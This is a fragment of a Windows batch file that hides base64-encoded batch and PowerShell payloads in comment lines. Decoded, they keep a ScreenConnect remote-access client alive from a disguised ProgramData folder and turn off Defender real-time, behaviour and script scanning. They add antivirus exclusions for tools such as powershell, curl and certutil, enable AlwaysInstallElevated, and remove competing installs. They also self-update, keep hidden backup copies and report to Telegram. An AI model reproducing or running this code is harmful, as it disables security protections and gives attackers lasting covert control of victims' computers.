::IC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHN0YXRlIC1Xb3JrRGly
::ICIlV0QlIiAtQnVpbGQgJU1PTlZFUiUgLUV4dHJhICJtc2ktZmFpbGVkIiA+bnVs
::IDI+JjENCiAgY2FsbCA6VGdTdGF0ZSBGQUlMICJNU0kgaW5zdGFsbCBmYWlsZWQg
::b24gYWxsIHNvdXJjZXMgKG1zaWV4ZWMgZXhpdCAlTVNJRVhJVCUpIg0KKSBlbHNl
::ICgNCiAgZWNobyBzdmMgcmVzdG9yZWQ+PiIlTE9HJSINCiAgcG93ZXJzaGVsbCAt
::Tm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFz
::cyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiBzdGF0ZSAtV29ya0Rp
::ciAiJVdEJSIgLUJ1aWxkICVNT05WRVIlIC1FeHRyYSAicmVzdG9yZWQiID5udWwg
::Mj4mMQ0KICBjYWxsIDpUZ1N0YXRlIFJFU1RPUkVEICJTY3JlZW5Db25uZWN0IHJl
::aW5zdGFsbGVkIE9LIg0KKQ0KDQo6QWZ0ZXJIZWFsDQpyZW0gTTE2OiBBTFQgcHJl
::c2VudC1idXQtc3RvcHBlZCAtPiByZXN0YXJ0LCB0aGVuIHJlcGFpci1ieS1HVUlE
::IChldmVyeSB0aWNrKQ0Kc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgl
::QUxUX0ZQJSkiID5udWwgMj4mMQ0KaWYgbm90IGVycm9ybGV2ZWwgMSAoDQogIHNj
::IHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUFMVF9GUCUpIiB8IGZpbmQg
::IlJVTk5JTkciID5udWwNCiAgaWYgZXJyb3JsZXZlbCAxICgNCiAgICBlY2hvIGFs
::dCBzdG9wcGVkIC0gcmVzdGFydC9yZXBhaXI+PiIlTE9HJSINCiAgICBuZXQgc3Rh
::cnQgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglQUxUX0ZQJSkiID5udWwgMj4mMQ0K
::ICAgIHNjIHN0YXJ0ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUFMVF9GUCUpIiA+
::bnVsIDI+JjENCiAgICB0aW1lb3V0IC90IDUgL25vYnJlYWsgPm51bA0KICAgIHNj
::IHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUFMVF9GUCUpIiB8IGZpbmQg
::IlJVTk5JTkciID5udWwNCiAgICBpZiBlcnJvcmxldmVsIDEgaWYgZXhpc3QgIiVX
::RCVcb3duX2xpYi5wczEiIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJh
::Y3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xp
::Yi5wczEiIC1BY3Rpb24gcmVwYWlyIC1GcCAiJUFMVF9GUCUiIC1Xb3JrRGlyICIl
::V0QlIiA+PiIlTE9HJSIgMj4mMQ0KICApDQopDQpyZW0gTTE3OiBBTFQgc2Vydmlj
::ZSBlbnRyeSBkZWxldGVkIGJ1dCBwcm9kdWN0IHJlZ2lzdGVyZWQgLT4gcmVwYWly
::LWJ5LUdVSUQgZXZlcnkgdGljaw0Kc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xp
::ZW50ICglQUxUX0ZQJSkiID5udWwgMj4mMQ0KaWYgZXJyb3JsZXZlbCAxICgNCiAg
::ZWNobyBhbHRfbWlzc2luZ190cnlfcmVwYWlyPj4iJUxPRyUiDQogIGlmIGV4aXN0
::ICIlV0QlXG93bl9saWIucHMxIiBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbklu
::dGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93
::bl9saWIucHMxIiAtQWN0aW9uIHJlcGFpciAtRnAgIiVBTFRfRlAlIiAtV29ya0Rp
::ciAiJVdEJSIgPj4iJUxPRyUiIDI+JjENCikNCnJlbSAoZXh0ZXJtaW5hdGlvbiBh
::bHJlYWR5IHJhbiBwcmUtaGVhbCBpbiBbRV07IGZvcmVpZ24gc3Vydml2b3JzIGNv
::dW50ZWQgdGhlcmUpDQoNCnJlbSDilIDilIAgW0ZdIHN0ZWFsdGggcmUtc2VjdXJl
::IChxdWlldCBEZWZlbmRlciBleGNsdXNpb24gcmVmcmVzaCkg4pSA4pSADQpyZW0g
::TTM5L000MzogTXBQcmVmZXJlbmNlIHdoZW4gV2luRGVmZW5kIGFsaXZlOyBhbHdh
::eXMgYWxzbyB3cml0ZSBwb2xpY3kvZXhjbHVzaW9uIFJFRw0KcmVtIChIZWxsIGhv
::c3Q6IFdpbkRlZmVuZCBkZWFkIOKGkiAweDgwMDEwNmJhLCBidXQgQU1TSSBzdGls
::bCBibG9ja2VkIFBTIOKAlCByZWcgZXhjbHVzaW9ucyBjb3ZlciBpdCkNCnJlZyBh
::ZGQgIkhLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3MgRGVm
::ZW5kZXJcUmVhbC1UaW1lIFByb3RlY3Rpb24iIC92IERpc2FibGVSZWFsdGltZU1v
::bml0b3JpbmcgL3QgUkVHX0RXT1JEIC9kIDEgL2YgPm51bCAyPiYxDQpyZWcgYWRk
::ICJIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVu
::ZGVyXFJlYWwtVGltZSBQcm90ZWN0aW9uIiAvdiBEaXNhYmxlU2NyaXB0U2Nhbm5p
::bmcgL3QgUkVHX0RXT1JEIC9kIDEgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xN
::XFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNc
::UGF0aHMiIC92ICIlV0QlIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjEN
::CnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5k
::ZXJcRXhjbHVzaW9uc1xQYXRocyIgL3YgIiVFVEwlIiAvdCBSRUdfRFdPUkQgL2Qg
::MCAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcTWljcm9zb2Z0
::XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3YgIiVTeXN0ZW1S
::b290JVxUZW1wXC51cGQiIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0K
::cmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRl
::clxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVByb2dyYW1GaWxlcyVcU2NyZWVuQ29u
::bmVjdCBDbGllbnQqIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCnJl
::ZyBhZGQgIkhLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJc
::RXhjbHVzaW9uc1xQYXRocyIgL3YgIiVQcm9ncmFtRmlsZXMoeDg2KSVcU2NyZWVu
::Q29ubmVjdCBDbGllbnQqIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjEN
::CnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5k
::ZXJcRXhjbHVzaW9uc1xQcm9jZXNzZXMiIC92ICJTY3JlZW5Db25uZWN0LkNsaWVu
::dFNlcnZpY2UuZXhlIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCnJl
::ZyBhZGQgIkhLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJc
::RXhjbHVzaW9uc1xQcm9jZXNzZXMiIC92ICJtc2lleGVjLmV4ZSIgL3QgUkVHX0RX
::T1JEIC9kIDAgL2YgPm51bCAyPiYxDQpwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5v
::bkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1Db21tYW5kICIk
::RXJyb3JBY3Rpb25QcmVmZXJlbmNlPSdTaWxlbnRseUNvbnRpbnVlJzsgdHJ5e1Nl
::dC1NcFByZWZlcmVuY2UgLURpc2FibGVSZWFsdGltZU1vbml0b3JpbmcgJHRydWV9
::Y2F0Y2h7fTsgdHJ5e1NldC1NcFByZWZlcmVuY2UgLURpc2FibGVTY3JpcHRTY2Fu
::bmluZyAkdHJ1ZX1jYXRjaHt9OyB0cnl7QWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVz
::aW9uUGF0aCAnJVdEJScsJyVFVEwlJywoSm9pbi1QYXRoICRlbnY6UHJvZ3JhbUZp
::bGVzICdTY3JlZW5Db25uZWN0IENsaWVudConKSwoSm9pbi1QYXRoICR7ZW52OlBy
::b2dyYW1GaWxlcyh4ODYpfSAnU2NyZWVuQ29ubmVjdCBDbGllbnQqJykgLUVycm9y
::QWN0aW9uIFN0b3B9Y2F0Y2h7fTsgZm9yZWFjaCgkeCBpbiBAKCdTY3JlZW5Db25u
::ZWN0LkNsaWVudFNlcnZpY2UuZXhlJywnU2NyZWVuQ29ubmVjdC5XaW5kb3dzQ2xp
::ZW50LmV4ZScsJ21zaWV4ZWMuZXhlJywncG93ZXJzaGVsbC5leGUnKSl7dHJ5e0Fk
::ZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblByb2Nlc3MgJHggLUVycm9yQWN0aW9u
::IFNpbGVudGx5Q29udGludWV9Y2F0Y2h7fX0iID5udWwgMj4mMQ0KDQpyZW0g4pSA
::4pSAIFtHXSBwZXJpb2RpYyBmdWxsIHJlLXNlY3VyZSBldmVyeSB+MiBoIOKUgOKU
::gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
::gOKUgOKUgA0KcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAt
::Q29tbWFuZCAiaWYoKFRlc3QtUGF0aCAnJVdEJVxvd25fc2VjdXJlLmNtZCcpIC1h
::bmQgKCggLW5vdCAoVGVzdC1QYXRoICclV0QlXHNlYy5mbGFnJykpIC1vciAoKChH
::ZXQtRGF0ZSkgLSAoR2V0LUl0ZW0gLUxpdGVyYWxQYXRoICclV0QlXHNlYy5mbGFn
::JykuTGFzdFdyaXRlVGltZSkuVG90YWxIb3VycyAtZ2UgMikpKXsgZXhpdCAxIH0g
::ZWxzZSB7IGV4aXQgMCB9IiA+bnVsIDI+JjENCmlmIGVycm9ybGV2ZWwgMSAoDQog
::IGVjaG8gcGVyaW9kaWMgcmUtc2VjdXJlPj4iJUxPRyUiDQogIGNhbGwgIiVXRCVc
::b3duX3NlY3VyZS5jbWQiID4+IiVMT0clIiAyPiYxDQogIGVjaG8gZG9uZT4iJVdE
::JVxzZWMuZmxhZyINCikNCg0KcmVtIOKUgOKUgCBbSF0gcXVpZXQgZGlnZXN0IChz
::a2lwIGhlYWx0aHkgaG9zdHMg4oCUIHdhcyBmbG9vZGluZyBUZWxlZ3JhbSkg4pSA
::4pSADQppZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgcG93ZXJzaGVsbCAtTm9Q
::cm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAt
::RmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiBzdGF0ZSAtV29ya0RpciAi
::JVdEJSIgLUJ1aWxkICVNT05WRVIlID5udWwgMj4mMQ0Kc2V0ICJORUVEX0hCPTAi
::DQppZiAiJVBSSU1fT0slIj09IjAiIHNldCAiTkVFRF9IQj0xIg0KaWYgJUZPUkVJ
::R05fTEVGVCUgR1RSIDAgc2V0ICJORUVEX0hCPTEiDQppZiAiJU5FRURfSEIlIj09
::IjAiICgNCiAgZWNobyBoYl9za2lwX2hlYWx0aHk+PiIlTE9HJSINCikgZWxzZSAo
::DQogIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUNvbW1h
::bmQgImlmKChUZXN0LVBhdGggJyVIQkZMQUclJykgLWFuZCAoTmV3LVRpbWVTcGFu
::IC1TdGFydCAoR2V0LUl0ZW0gLUxpdGVyYWxQYXRoICclSEJGTEFHJScpLkxhc3RX
::cml0ZVRpbWUpLlRvdGFsTWludXRlcyAtbHQgMzYwKXsgZXhpdCAwIH0gZWxzZSB7
::IGV4aXQgMSB9IiA+bnVsIDI+JjENCiAgaWYgZXJyb3JsZXZlbCAxICgNCiAgICBl
::Y2hvIGhiPiVIQkZMQUclDQogICAgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25J
::bnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVx0
::Z19yZXBvcnQucHMxIiAtU3RhdGUgSEIgLU1vZGUgY29tcGFjdCAtQnVpbGQgJU1P
::TlZFUiUgLUNvdW50ICFDT1VOVCEgPm51bCAyPiYxDQogICAgZWNobyBkaWdlc3Qg
::SEIgc2VudD4+IiVMT0clIg0KICApDQopDQoNCnJlbSDilIDilIAgW0ldIHNlbGYt
::dXBkYXRlIGFwcGx5IChsYXN0IHRoaW5nIHRoaXMgdGljaykg4pSA4pSA4pSA4pSA
::4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSADQppZiAiJVNFTEZfVVBEJSI9
::PSIxIiBpZiBleGlzdCAiJVNUQUdFJVxvd25fbW9uLm5leHQiICgNCiAgY2FsbCA6
::UmVmdXNlSWZNb25CZWxvd0Zsb29yICIlU1RBR0UlXG93bl9tb24ubmV4dCINCiAg
::aWYgZXJyb3JsZXZlbCAxICgNCiAgICBlY2hvIG1vbl9hcHBseV9yZWZ1c2VkX2Rv
::d25ncmFkZSBmbG9vcj0hTU9OX0ZMT09SIT4+IiVMT0clIg0KICAgIGRlbCAvZiAv
::cSAiJVNUQUdFJVxvd25fbW9uLm5leHQiID5udWwgMj4mMQ0KICApIGVsc2UgKA0K
::ICAgIGVjaG8gc2VsZi11cGRhdGUgYXBwbHk+PiIlTE9HJSINCiAgICBhdHRyaWIg
::LWggLXMgLXIgIiVXRCVcb3duX21vbi5jbWQiID5udWwgMj4mMQ0KICAgIG1vdmUg
::L3kgIiVTVEFHRSVcb3duX21vbi5uZXh0IiAiJVdEJVxvd25fbW9uLmNtZCIgPm51
::bCAyPiYxDQogICAgY2FsbCA6UGFyc2VNb25OdW0gIiVXRCVcb3duX21vbi5jbWQi
::DQogICAgaWYgIV9QTiEgR1RSICFNT05fRkxPT1IhIHNldCAiTU9OX0ZMT09SPSFf
::UE4hIg0KICAgIGNhbGwgOlNhdmVGbG9vcg0KICApDQopDQpyZW0ga2VlcCBkdWFs
::LXBhdGggYmFja3VwIGluIHN5bmMgZXZlcnkgdGljaw0KaWYgbm90IGV4aXN0ICIl
::RVRMJSIgbWtkaXIgIiVFVEwlIiA+bnVsIDI+JjENCmlmIGV4aXN0ICIlV0QlXG93
::bl9tb24uY21kIiAoDQogIGF0dHJpYiAtaCAtcyAtciAiJUVUTCVcZXRsX21vbi5j
::bWQiID5udWwgMj4mMQ0KICBjb3B5IC95ICIlV0QlXG93bl9tb24uY21kIiAiJUVU
::TCVcZXRsX21vbi5jbWQiID5udWwgMj4mMQ0KKQ0KZGVsIC9mIC9xICIlTVVURVgl
::IiA+bnVsIDI+JjENCg0KZWNobyB0aWNrIGRvbmU6IHByaW09JVBSSU1fT0slIGFs
::dD0lQUxUX09LJSBmb3JlaWduPSVGT1JFSUdOX0xFRlQlPj4iJUxPRyUiDQplbmRs
::b2NhbA0KZXhpdCAvYiAwDQoNCnJlbSDilZDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZDilZDilZDilZDilZAgaGVscGVycyDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZDilZDilZDilZDilZDilZDilZANCjpTYXZlRmxvb3INCigNCmVjaG8g
::TU9OX0ZMT09SPSFNT05fRkxPT1IhDQplY2hvIExJQl9GTE9PUj0hTElCX0ZMT09S
::IQ0KKT4iJUZMT09SX0ZJTEUlIg0KZXhpdCAvYiAwDQoNCjpQYXJzZU1vbk51bQ0K
::c2V0ICJfUE49MCINCnNldCAiX1Q9Ig0KaWYgbm90IGV4aXN0ICIlfjEiIGV4aXQg
::L2IgMQ0KcmVtIHNwbGl0IHBhdHRlcm4gc28gdGhpcyBoZWxwZXIgbGluZSBpcyBu
::b3QgbWF0Y2hlZCBieSBmaW5kc3RyIGl0c2VsZg0Kc2V0ICJfRlBBVD1NT04iDQpz
::ZXQgIl9GUEFUPSFfRlBBVCFWRVI9Ig0KZm9yIC9mICJ1c2ViYWNrcSB0b2tlbnM9
::MiBkZWxpbXM9PSIgJSVWIGluIChgZmluZHN0ciAvQzoiIV9GUEFUISIgIiV+MSIg
::Ml4+bnVsYCkgZG8gc2V0ICJfVD0lJVYiDQppZiBkZWZpbmVkIF9UICgNCiAgc2V0
::ICJfVD0hX1Q6Ij0hIg0KICBzZXQgIl9UPSFfVDogPSEiDQogIHNldCAiX1BOPSFf
::VDpNPSEiDQopDQpzZXQgIl9GUEFUPSINCmV4aXQgL2IgMA0KDQo6UGFyc2VMaWJO
::dW0NCnNldCAiX1BOPTAiDQpzZXQgIl9UPSINCmlmIG5vdCBleGlzdCAiJX4xIiBl
::eGl0IC9iIDENCnJlbSBoZWFkZXI6ICMgT1dOX0xJQiAgQlVJTEQgMjAyNjA4MDRM
::NDggIC0+IHRva2VuIDQgaXMgdmVyc2lvbiAoc3BsaXQgcGF0dGVybiBhdm9pZHMg
::c2VsZi1tYXRjaCkNCnNldCAiX0ZQQVQ9T1dOX0xJQiINCnNldCAiX0ZQQVQ9IV9G
::UEFUISAgQlVJTEQiDQpmb3IgL2YgInVzZWJhY2txIHRva2Vucz00IiAlJVYgaW4g
::KGBmaW5kc3RyIC9DOiIhX0ZQQVQhIiAiJX4xIiAyXj5udWxgKSBkbyBzZXQgIl9U
::PSUlViINCmlmIGRlZmluZWQgX1QgKA0KICBzZXQgIl9UPSFfVDoiPSEiDQogIHNl
::dCAiX1BOPSFfVDoqTD0hIg0KKQ0Kc2V0ICJfRlBBVD0iDQpleGl0IC9iIDANCg0K
::OlJlZnVzZUlmTW9uQmVsb3dGbG9vcg0KY2FsbCA6UGFyc2VNb25OdW0gIiV+MSIN
::CmlmICIhX1BOISI9PSIiIHNldCAiX1BOPTAiDQppZiAhX1BOISBMU1MgIU1PTl9G
::TE9PUiEgZXhpdCAvYiAxDQppZiAhX1BOISBFUVUgMCBleGl0IC9iIDENCmV4aXQg
::L2IgMA0KDQo6UmVmdXNlSWZMaWJCZWxvd0Zsb29yDQpjYWxsIDpQYXJzZUxpYk51
::bSAiJX4xIg0KaWYgIiFfUE4hIj09IiIgc2V0ICJfUE49MCINCmlmICFfUE4hIExT
::UyAhTElCX0ZMT09SISBleGl0IC9iIDENCmlmICFfUE4hIEVRVSAwIGV4aXQgL2Ig
::MQ0KZXhpdCAvYiAwDQoNCg==
::B64_MON_END
::B64_SEC_BEGIN
::QGVjaG8gb2ZmDQpSRU0gT1dOX1NFQ1VSRSBCVUlMRCAyMDI2MDgwNFMxMyAtIHNl
::dnJ6LmNmZyBkeW5hbWljIEZQczsgU1kgREVMRVRFK1dSSVRFX0RBQw0Kc2V0bG9j
::YWwgRW5hYmxlRXh0ZW5zaW9ucyBFbmFibGVEZWxheWVkRXhwYW5zaW9uDQpzZXQg
::IldEPSVQcm9ncmFtRGF0YSVcTWljcm9zb2Z0XFdpbmRvd3NcV0VSXFRlbXBcLnd1
::Y2FjaGUiDQpzZXQgIldEMj0lUHJvZ3JhbURhdGElXE1pY3Jvc29mdFxEaWFnbm9z
::aXNcU3RhdGVcLmV0bGNhY2hlIg0Kc2V0ICJMT0c9JVdEJVxib290LmVyciINCnNl
::dCAiS0VFUDE9NWY2MDEwNTc5ODUyZTUwNyINCnNldCAiS0VFUDI9Zjg2MWM4MTQw
::ZDQ1MzQyNyINCmlmIGV4aXN0ICIlV0QlXHNldnJ6LmNmZyIgZm9yIC9mICJ1c2Vi
::YWNrcSB0b2tlbnM9MSwqIGRlbGltcz09IiAlJUsgaW4gKCIlV0QlXHNldnJ6LmNm
::ZyIpIGRvICgNCiAgaWYgL0kgIiUlSyI9PSJQUklNQVJZX0ZQIiBzZXQgIktFRVAx
::PSUlTCINCiAgaWYgL0kgIiUlSyI9PSJBTFRfRlAiIHNldCAiS0VFUDI9JSVMIg0K
::KQ0Kc2V0ICJQUklNPVNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDElKSINCnNl
::dCAiQUxUPVNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDIlKSINCnNldCAiUEY9
::JVByb2dyYW1GaWxlcyUiDQpzZXQgIlBGODY9JVByb2dyYW1GaWxlcyh4ODYpJSIN
::CnNldCAiVEFTS1JPT1Q9JVN5c3RlbVJvb3QlXFN5c3RlbTMyXFRhc2tzIg0KDQpp
::ZiBub3QgZXhpc3QgIiVXRCUiIG1rZGlyICIlV0QlIiA+bnVsIDI+JjENCmlmIG5v
::dCBleGlzdCAiJVdEMiUiIG1rZGlyICIlV0QyJSIgPm51bCAyPiYxDQplY2hvIHNl
::Y3VyZV9iZWdpbiAlREFURSUgJVRJTUUlIFMxMz4+IiVMT0clIg0KDQpSRU0gLS0t
::IE5ldXRyYWxpemUgTVNJIGJsb2NrIHBvbGljaWVzICgxNjI1KSAtLS0NClJFTSBE
::aXNhYmxlTVNJOiAwPWFsbG93LCAxPW5vbi1hZG1pbiBvbmx5LCAyPWFsbCAtPiBm
::b3JjZSAwDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29m
::dFxXaW5kb3dzXEluc3RhbGxlciIgL3YgRGlzYWJsZU1TSSAvdCBSRUdfRFdPUkQg
::L2QgMCAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcUG9saWNp
::ZXNcTWljcm9zb2Z0XFdpbmRvd3NcSW5zdGFsbGVyIiAvdiBBbHdheXNJbnN0YWxs
::RWxldmF0ZWQgL3QgUkVHX0RXT1JEIC9kIDEgL2YgPm51bCAyPiYxDQpyZWcgZGVs
::ZXRlICJIS0NVXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXElu
::c3RhbGxlciIgL3YgRGlzYWJsZU1TSSAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhL
::Q1VcU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3NcSW5zdGFsbGVy
::IiAvdiBBbHdheXNJbnN0YWxsRWxldmF0ZWQgL3QgUkVHX0RXT1JEIC9kIDEgL2Yg
::Pm51bCAyPiYxDQoNClJFTSAtLS0gRGVmZW5kZXI6IHJlZ2lzdHJ5IGV4Y2x1c2lv
::bnMgKHBvbGljeSArIHByZWZlcmVuY2Uga2V5cykgLS0tDQpyZWcgYWRkICJIS0xN
::XFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyIiAv
::diBEaXNhYmxlQW50aVNweXdhcmUgL3QgUkVHX0RXT1JEIC9kIDEgL2YgPm51bCAy
::PiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxX
::aW5kb3dzIERlZmVuZGVyXFJlYWwtVGltZSBQcm90ZWN0aW9uIiAvdiBEaXNhYmxl
::UmVhbHRpbWVNb25pdG9yaW5nIC90IFJFR19EV09SRCAvZCAxIC9mID5udWwgMj4m
::MQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2lu
::ZG93cyBEZWZlbmRlclxSZWFsLVRpbWUgUHJvdGVjdGlvbiIgL3YgRGlzYWJsZUJl
::aGF2aW9yTW9uaXRvcmluZyAvdCBSRUdfRFdPUkQgL2QgMSAvZiA+bnVsIDI+JjEN
::CnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRv
::d3MgRGVmZW5kZXJcUmVhbC1UaW1lIFByb3RlY3Rpb24iIC92IERpc2FibGVJT0FW
::UHJvdGVjdGlvbiAvdCBSRUdfRFdPUkQgL2QgMSAvZiA+bnVsIDI+JjENCnJlZyBh
::ZGQgIkhLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3MgRGVm
::ZW5kZXJcUmVhbC1UaW1lIFByb3RlY3Rpb24iIC92IERpc2FibGVTY3JpcHRTY2Fu
::bmluZyAvdCBSRUdfRFdPUkQgL2QgMSAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhL
::TE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9u
::c1xQYXRocyIgL3YgIiVXRCUiIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4m
::MQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBEZWZl
::bmRlclxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVdEMiUiIC90IFJFR19EV09SRCAv
::ZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3Nv
::ZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhzIiAvdiAiQzpcV2lu
::ZG93c1xUZW1wIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCnJlZyBh
::ZGQgIkhLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhj
::bHVzaW9uc1xQYXRocyIgL3YgIiVURU1QJSIgL3QgUkVHX0RXT1JEIC9kIDAgL2Yg
::Pm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5k
::b3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92ICIlUEYlXFNjcmVlbkNv
::bm5lY3QgQ2xpZW50ICglS0VFUDElKSIgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51
::bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dz
::IERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92ICIlUEYlXFNjcmVlbkNvbm5l
::Y3QgQ2xpZW50ICglS0VFUDIlKSIgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAy
::PiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERl
::ZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92ICIlUEYlXFNjcmVlbkNvbm5lY3Qg
::Q2xpZW50KiIgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRk
::ICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1
::c2lvbnNcUGF0aHMiIC92ICIlUEY4NiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVL
::RUVQMSUpIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCnJlZyBhZGQg
::IkhLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVz
::aW9uc1xQYXRocyIgL3YgIiVQRjg2JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtF
::RVAyJSkiIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAi
::SEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNp
::b25zXFBhdGhzIiAvdiAiJVBGODYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50KiIgL3Qg
::UkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpmb3IgJSVQIGluIChtc2lleGVj
::LmV4ZSBjdXJsLmV4ZSBjbWQuZXhlIHBvd2Vyc2hlbGwuZXhlIGNlcnR1dGlsLmV4
::ZSBTY3JlZW5Db25uZWN0LkNsaWVudFNlcnZpY2UuZXhlIFNjcmVlbkNvbm5lY3Qu
::V2luZG93c0NsaWVudC5leGUpIGRvICgNCiAgcmVnIGFkZCAiSEtMTVxTT0ZUV0FS
::RVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFByb2Nlc3Nl
::cyIgL3YgIiUlUCIgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQopDQoN
::ClJFTSAtLS0gRGVmZW5kZXI6IGxpdmUgTXBQcmVmZXJlbmNlIChzdHJvbmdlciB0
::aGFuIHJlZyBhbG9uZSkgLS0tDQpwb3dlcnNoZWxsLmV4ZSAtTm9Qcm9maWxlIC1O
